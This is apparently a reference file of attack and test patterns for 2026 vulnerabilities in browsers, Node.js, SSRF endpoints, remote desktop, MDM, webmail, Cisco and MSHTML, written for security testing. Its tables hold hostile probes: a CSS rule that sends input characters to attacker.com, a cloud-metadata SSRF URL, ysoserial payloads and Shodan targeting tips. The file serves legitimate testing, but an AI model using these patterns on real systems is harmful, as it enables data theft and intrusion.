# Infrastructure & Platform Vulnerability Patterns

Attack patterns targeting infrastructure components: browser exploits, Node.js sandboxing, SSRF chains, remote access tools, MDM platforms, webmail, critical network infrastructure, and Windows trust mechanism bypasses. Reference file for the vuln-patterns skill.

> **API & protocol patterns** (GraphQL, JWT, OAuth, rate limiting, n8n/workflow, edge frameworks, HTTP/3 race conditions): See [web-vulns.md](web-vulns.md)

---

## Table of Contents

- [CSS-Only Data Exfiltration (CSP Bypass)](#css-only-data-exfiltration-csp-bypass)
- [Node.js Permission Model & TLS Bypass](#nodejs-permission-model--tls-bypass)
- [SSRF via Webhook, Notification, and Import Endpoints](#ssrf-via-webhook-notification-and-import-endpoints)
- [Self-Hosted Remote Desktop Pre-Auth Attack Chains](#self-hosted-remote-desktop-pre-auth-attack-chains)
- [Mobile Device Management Pre-Auth RCE](#mobile-device-management-pre-auth-rce)
- [OAuth First-Party App Trust Abuse (ConsentFix)](#oauth-first-party-app-trust-abuse-consentfix)
- [Webmail RCE — 48-Hour Weaponization Pattern](#webmail-rce--48-hour-weaponization-pattern)
- [Critical Infrastructure Authentication & Deserialization](#critical-infrastructure-authentication--deserialization)
- [MSHTML Mark-of-the-Web Bypass Chain](#mshtml-mark-of-the-web-bypass-chain)

---

## CSS-Only Data Exfiltration (CSP Bypass)

**What it is:** Using CSS features (`@import` chaining, `@property` registration, `paint()` worklets) to exfiltrate data without JavaScript — defeating most Content Security Policy configurations.

**Key CVE:** CVE-2026-2441 (Chrome, CVSS 8.8) — actively exploited before patch. Use-after-free in CSS parsing exploited via `@import` chaining with server-side redirect mechanism. Chrome re-evaluated selectors against DOM without full page reload.

**Where to look:**
- Applications relying on CSP to prevent XSS data exfiltration
- Pages with user-controlled CSS (custom themes, style injections, CSS-in-JS)
- Targets where JavaScript-based XSS is blocked but CSS injection is possible

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | CSS `@import` chain | Inject `@import url()` pointing to attacker-controlled server with redirects | Server receives requests with leaked data in URL parameters |
| 2 | `@property` + `paint()` | Register custom CSS property and worklet; check if compositor thread handles memory safely | Crash or unexpected behavior indicating UAF |
| 3 | Attribute selector exfiltration | Use `input[value^="a"] { background: url(attacker.com/?char=a) }` pattern | Character-by-character exfiltration of input values via CSS |
| 4 | CSS-only keylogging | Combine attribute selectors with `@import` to detect keypresses via style changes | Keystroke data leaked without any JavaScript |
| 5 | Font-based exfiltration | Use `@font-face` with `unicode-range` to detect specific characters on page | Selective font loading reveals page content |

**Severity Guidance:** High-Critical when CSP is the primary XSS mitigation. This bypasses JavaScript-based CSP entirely. Report as CSP bypass + data exfiltration chain. Patched in Chrome Feb 13, 2026 — test other browsers for similar issues.

---

## Node.js Permission Model & TLS Bypass

**What it is:** Exploiting flaws in Node.js's experimental permission model and TLS implementation.

**Key CVEs:**
- **CVE-2026-21636**: Permission model bypass via Unix Domain Socket connections — attackers bypass file/network access restrictions entirely
- **CVE-2026-21637**: TLS PSK/ALPN callback exceptions — uncaught exceptions in TLS callbacks cause process crashes (DoS)

**Where to look:**
- Applications running Node.js with `--experimental-permission` flag
- Services using Node.js TLS with PSK or ALPN callbacks
- Any Node.js app relying on the permission model for security boundaries

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | UDS permission bypass | Connect via Unix Domain Socket to bypass permission model restrictions | File/network access without permission grant |
| 2 | TLS PSK callback crash | Send TLS connection with crafted PSK identity that triggers exception in callback | Process crash (DoS) |
| 3 | ALPN callback exception | Connect with ALPN protocol list that triggers unhandled exception | Process crash via TLS negotiation |

**Severity Guidance:** High for permission model bypass (security boundary violation); Medium for TLS DoS (service availability). Permission model bypass is especially impactful when apps rely on it for sandboxing — test any Node.js service that uses `--experimental-permission`.

---

## SSRF via Webhook, Notification, and Import Endpoints

**What it is:** Server-Side Request Forgery through webhook URL validators, notification testers, and asset import features that perform incomplete IP validation.

**Recent CVE cluster (March 2026):**
- **CVE-2026-30832** (Soft Serve Git, CVSS 9.1): blind SSRF via LFS endpoint in repo import → full read via malicious LFS server chain
- **CVE-2026-28680** (Ghostfolio, CVSS 9.3): full-read SSRF via manual asset import → AWS IMDS credential exfiltration
- **CVE-2026-30840** (Wallos, CVSS 8.8): authenticated SSRF via notification tester endpoints
- **CVE-2026-30242** (Plane, CVSS 8.5): webhook URL serializer only checks `is_loopback`, not RFC 1918 ranges
- **CVE-2026-30834** (PinchTab, CVSS 7.5): API-accessible SSRF via `/download` endpoint

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Incomplete IP validation | Use `10.0.0.1`, `172.16.0.1`, `192.168.1.1` when only loopback is blocked | Access to internal network when only 127.0.0.1 is validated |
| 2 | Webhook URL test | Set webhook URL to `http://169.254.169.254/latest/meta-data/` | Cloud metadata accessible via webhook test |
| 3 | Notification tester | Use notification test/preview features with internal URLs | Response body or timing reveals internal service access |
| 4 | Asset import SSRF | Import asset/URL/feed from `http://internal-service:port/` | Import fetches internal resources |
| 5 | LFS/Git import chain | Configure repo with malicious LFS server pointing to internal targets | SSRF triggered during git LFS fetch operations |
| 6 | DNS rebinding | Use DNS rebinding to bypass IP validation at resolution time | Initial DNS resolves to allowed IP, subsequent resolve to internal |

**Severity Guidance:** Critical when full response read-back enables credential theft (cloud metadata, internal APIs). High for blind SSRF. The "only checks loopback" pattern is the most common validation gap — always test RFC 1918 ranges.

---

## Self-Hosted Remote Desktop Pre-Auth Attack Chains

**What it is:** Authentication bypass and SSRF in self-hosted remote desktop (RustDesk, Guacamole, MeshCentral) commonly exposed to the internet.

**Key CVE cluster (RustDesk, March 2026):** CVE-2026-30789 (session replay auth bypass, Client ≤1.4.5), CVE-2026-30784 (missing authz, Server ≤1.7.5), CVE-2026-30797 (API MitM), CVE-2026-30796 (cleartext creds), CVE-2026-30791 (weak crypto), plus pre-auth SSRF before password verification.

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Session replay | Capture and replay authentication session tokens | Access granted with replayed credentials (CVE-2026-30789) |
| 2 | Pre-auth SSRF | Send requests to internal IPs before authenticating | Internal port scan results returned before password check |
| 3 | API message manipulation | Intercept and modify API messages between client and server | Unauthorized operations via modified messages |

**Severity Guidance:** High-Critical for pre-auth chains (SSRF + session replay = full infrastructure access). Scan Shodan for `rustdesk` on ports 21115-21119.

---

## Mobile Device Management Pre-Auth RCE

**What it is:** Unauthenticated RCE in enterprise MDM platforms — high-value because MDM servers control thousands of devices with elevated privileges.

**Key CVEs (Ivanti EPMM, Jan-Feb 2026):** CVE-2026-1281 (CVSS 9.8, pre-auth RCE via `/mifs/c/appstore/fob/`, public PoC, mass exploitation) and CVE-2026-1340 (CVSS 9.8, companion RCE via `/mifs/c/aftstore/fob/`).

**Where to look:** Ivanti EPMM/MobileIron, ManageEngine, VMware Workspace ONE, Microsoft Intune. Search Shodan: `"MobileIron"`, `"/mifs/"` paths.

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Unauthenticated endpoints | Fuzz MDM admin paths without credentials | Admin functions accessible pre-auth |
| 2 | File upload via enrollment | Use device enrollment endpoints to upload arbitrary files | Web shell deployment via enrollment flow |
| 3 | API version mismatch | Test legacy API versions alongside current ones | Older APIs may lack auth checks |

**Severity Guidance:** Critical — compromised MDM = full mobile fleet control (push configs, install apps, wipe devices).

---

## OAuth First-Party App Trust Abuse (ConsentFix)

**What it is:** Abusing trusted first-party application status in OAuth/SSO implementations to bypass MFA and Conditional Access policies.

**Key disclosure:** ConsentFix (Push Security, March 2026) — Azure CLI's first-party trust status allows it to obtain OAuth tokens that bypass MFA and Conditional Access entirely. Attacker phishes victim into pasting a URL containing OAuth key material.

**Where to look:**
- Microsoft Entra ID / Azure AD environments with first-party apps
- Any SSO implementation with implicitly trusted applications excluded from consent restrictions
- OAuth flows where first-party apps are exempt from security policies

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | First-party token abuse | Use first-party client IDs (e.g., Azure CLI) in OAuth flows | Token obtained without MFA/Conditional Access |
| 2 | Admin consent bypass | First-party apps excluded from admin consent restrictions | Elevated permissions granted without admin approval |
| 3 | Cross-tenant token use | Use token from first-party app flow across tenants | Token valid in unintended tenant |

**Severity Guidance:** Critical — bypasses MFA entirely. Relevant for any enterprise using Microsoft Entra ID. Maps to Fortinet CVE-2026-24858 (FortiCloud SSO auth bypass, CISA KEV) as part of a broader SSO trust model abuse pattern.

---

## Webmail RCE — 48-Hour Weaponization Pattern

**What it is:** Critical RCE/XSS in webmail platforms weaponized within days, targeting ~84,000+ internet-facing instances.

**Key CVEs (Roundcube, Feb 2026):** CVE-2025-49113 (CVSS 9.9, RCE weaponized in 48h, CISA KEV) and CVE-2025-68461 (stored XSS in message rendering).

**Where to look:** Self-hosted webmail (Roundcube, Zimbra, Horde), enterprise email gateways, Roundcube < 1.6.10 / < 1.5.10.

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Version fingerprint | Check `/program/lib/Roundcube/rcube.php` or server headers | Unpatched Roundcube version |
| 2 | Stored XSS via email | Send crafted email with malicious HTML/JS in body or headers | Script execution in victim's webmail session |
| 3 | MIME parsing abuse | Send email with malformed MIME structure | Parser confusion leading to code execution |

**Severity Guidance:** Critical — webmail accesses all email content and contacts. 48-hour weaponization means unpatched instances are likely compromised.

---

## Critical Infrastructure Authentication & Deserialization

**What it is:** Auth bypass and Java deserialization RCE in network management interfaces — often CVSS 10.0 with root access.

**Recent examples:** CVE-2026-20079/20131 (Cisco FMC, CVSS 10.0 pair: boot-time auth bypass + Java deser RCE → root), CVE-2026-22719 (VMware Aria, CVSS 8.1, CISA KEV, actively exploited), CVE-2026-20128/20122 (Cisco SD-WAN, actively exploited March 2026), CVE-2026-24512 (K8s ingress-nginx, CVSS 8.8, project retiring — no future patches for 50% of clusters), CVE-2026-20965 (Azure WAC, SSO pivot tenant-wide).

**Where to look:** Network management consoles, Java-based management APIs, migration/upgrade workflows, boot-time service processes.

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Boot process auth bypass | Identify boot-time services with improper auth initialization | Admin access without credentials |
| 2 | Java deser on management APIs | Send crafted serialized objects (ysoserial payloads) to management endpoints | RCE indicating deserialization processing |
| 3 | Migration workflow injection | Test migration/upgrade endpoints for command injection | Command execution during privileged operations |

**Severity Guidance:** Critical — consistently CVSS 9.8-10.0 with root access. High-value because enterprises delay patching management infrastructure.

---

## MSHTML Mark-of-the-Web Bypass Chain

**What it is:** Exploiting URL validation flaws in Windows MSHTML/IE components to bypass Mark-of-the-Web (MotW) protections and achieve code execution — a recurring pattern across multiple February 2026 zero-days.

**Key CVEs (February 2026 Patch Tuesday — 6 actively exploited zero-days):**
- **CVE-2026-21513** (MSHTML, CVSS 8.8): insufficient URL validation in `ieframe.dll` → MotW bypass + IE ESC bypass → `ShellExecuteExW` code execution. Attributed to APT28 (Russia). LNK file payload communicating with `wellnesscaremed[.]com`. Akamai published detailed exploitation analysis.
- **CVE-2026-21510** (Windows Shell, CVSS 8.8): security feature bypass in Windows Shell — MotW bypass enabling untrusted content execution
- **CVE-2026-21514** (Microsoft Word, CVSS 7.8): security feature bypass — MotW bypass specifically via crafted Word documents
- **CVE-2026-21519** (Desktop Window Manager, CVSS 7.8): privilege escalation — post-exploitation elevation
- **CVE-2026-21533** (Windows Remote Desktop, CVSS 7.8): privilege escalation via Remote Desktop Services

**Why MotW bypass matters:** MotW is Windows' primary trust mechanism for files downloaded from the internet. Bypassing it means SmartScreen, Protected View, and macro-blocking protections are all defeated. Three separate MotW bypasses in a single Patch Tuesday (CVE-2026-21510, 21513, 21514) indicates this is a hot vulnerability class being actively researched by both APT groups and security researchers.

**Where to look:**
- Any Windows application processing URLs or web content through MSHTML/IE components
- Applications using `ieframe.dll`, `mshtml.dll`, or legacy IE rendering
- Electron and CEF-based apps that may invoke IE components for URL handling
- File format handlers that embed URLs (LNK, DOCX, RTF, PDF)

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | URL validation in IE components | Craft URLs that pass validation but invoke dangerous handlers via `ieframe.dll` | MotW removed from downloaded content; SmartScreen bypassed |
| 2 | LNK file MotW bypass | Create LNK files with crafted target URLs containing MSHTML-triggering paths | File executes without Protected View warning |
| 3 | DOCX embedded URL bypass | Embed URLs in Word documents that invoke legacy IE rendering paths | Macros/scripts execute without MotW protection |
| 4 | IE ESC bypass chain | Chain URL validation flaw with Internet Explorer Enhanced Security Configuration bypass | Full code execution from restricted browsing context |
| 5 | Cross-zone navigation | Craft URLs that transition from Internet zone to Local Machine zone via parser confusion | Elevated privileges for web content |

**Severity Guidance:** High-Critical. MotW bypasses are consistently rated CVSS 7.8-8.8 and are actively exploited by nation-state actors. The pattern recurs because Windows has multiple independent URL parsing/validation paths (Shell, MSHTML, Word, Explorer) that can disagree on trust. Any application that invokes Windows URL handling is a potential target. Check if target applications pass external URLs to Windows Shell functions without independent validation.

---

## Chrome Sandbox Escape via Navigation (March 2026)

**Key CVE:** CVE-2026-3545 (CVSS 9.6) — sandbox escape via insufficient data validation in Chrome's Navigation component.

**Why it matters:** Chrome sandbox escapes are rare and extremely high value ($100K+ in Google's VRP). This CVE demonstrates that Navigation component data validation is an active variant analysis target.

**Where to look:** Applications embedding Chromium (Electron, CEF-based apps) may inherit navigation validation flaws. AI IDEs like Cursor and Windsurf ship legacy Chromium builds with 94+ known vulnerabilities (OX Security research).

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Navigation data validation | Craft navigation events with malformed or unexpected data types | Sandbox boundary crossed during navigation |
| 2 | Embedded Chromium version check | Identify Chromium version in Electron/CEF apps | Unpatched versions vulnerable to known sandbox escapes |
| 3 | Cross-origin navigation abuse | Test navigation flows between different origin contexts | Privilege escalation across origin boundaries |

**Severity Guidance:** Critical. Sandbox escapes enable full system compromise from a web page. Variant analysis across Chromium navigation code paths is high-value.

---

## Industrial Control System RCE (March 2026)

**Key CVEs:**
- **CVE-2026-3630** (Delta Electronics COMMGR2, CVSS 9.8): stack buffer overflow enabling unauthenticated remote RCE in industrial communication gateway
- **CVE-2026-20079/20131** (Cisco FMC, dual CVSS 10.0): unauthenticated remote root access on Cisco Firepower Management Center

**Why it matters:** ICS/OT targets are increasingly in scope for enterprise bug bounty programs. Critical infrastructure vendors like Cisco and Delta have VDPs and some run bounty programs.

**Where to look:** Internet-exposed management interfaces for network appliances, SCADA gateways, and industrial controllers. Use Shodan/Censys to identify exposed instances.

**Severity Guidance:** Critical (CVSS 9.8-10.0). These represent the highest-severity bug class. Report with clear network exposure evidence.
